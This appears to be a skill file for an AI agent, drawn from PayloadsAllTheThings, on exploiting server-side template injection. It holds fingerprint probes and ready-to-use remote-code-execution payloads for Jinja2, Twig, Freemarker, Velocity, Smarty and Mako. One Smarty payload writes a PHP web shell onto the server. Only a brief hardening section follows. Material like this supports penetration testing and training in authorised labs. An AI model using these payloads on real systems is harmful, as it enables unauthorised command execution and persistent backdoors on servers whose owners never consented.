---
name: ssti
description: Exploit Server-Side Template Injection across Jinja2, Twig, Freemarker, Velocity, ERB, Smarty, Mako, Handlebars, Razor; engine fingerprint and RCE chains
domain: cybersecurity
subdomain: web-application-security
tags: [ssti, jinja2, twig, freemarker, rce]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/Server Side Template Injection
---

# Server-Side Template Injection (SSTI)

## Overview
User input concatenated into a server-side template lets attacker run template expressions. Most engines expose enough reflection to reach OS command execution.

## Fingerprint Probes
```
${7*7}      ${{7*7}}   {{7*7}}   #{7*7}   <%= 7*7 %>   *{7*7}
```
Result `49` → engine that evaluates. Continue with `{{7*'7'}}`:
- `49` Twig.
- `7777777` Jinja2 / Mako (Python string mult).
- Error → Smarty / Velocity.

## Engine-Specific RCE Payloads

### Jinja2 / Flask
```
{{ ''.__class__.__mro__[1].__subclasses__() }}                # list classes
{{ ''.__class__.__mro__[1].__subclasses__()[N]("id",shell=True,stdout=-1).communicate() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Twig (PHP)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

### Freemarker
```
<#assign x="freemarker.template.utility.Execute"?new()>${ x("id") }
```

### Velocity
```
#set($x = $rt.exec('id'))$x.waitFor()$x.inputStream.text
```

### Smarty
```
{php}system('id');{/php}        (≤2.x)
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET[c]);?>",self::clearConfig())}
```

### Mako (Python)
```
<%import os; x=os.popen('id').read()%>${x}
```

### Handlebars / Pug / ERB / Razor
Each has known sandbox-escape gadgets — see HackTricks SSTI per engine.

## Tools
- **tplmap** — automated SSTI exploit.
- Manual + Burp.

## Hardening
- Never `render_template_string(user_input)`. Use named templates and pass user data as context variables.
- Sandbox / restricted environments (Jinja2 `SandboxedEnvironment`) — still not fully safe.
- Output-only filters (`escape`); disable Python-level access.

## References
- `payloadsallthethings/Server Side Template Injection/README.md`
- PortSwigger SSTI labs.
